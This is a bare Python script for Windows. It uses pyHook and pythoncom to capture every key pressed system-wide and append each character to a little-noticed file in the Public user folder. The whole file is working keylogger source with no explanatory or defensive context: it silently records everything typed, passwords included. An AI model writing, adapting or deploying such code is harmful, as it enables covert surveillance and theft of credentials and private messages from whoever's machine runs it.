import sys, pyHook, pythoncom

file_log = 'C:\\Users\\Public\\l.txt'

def OnKeyboardEvent(event):
    target = open(file_log, 'a')
    target.write(chr(event.Ascii))
    target.close()
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()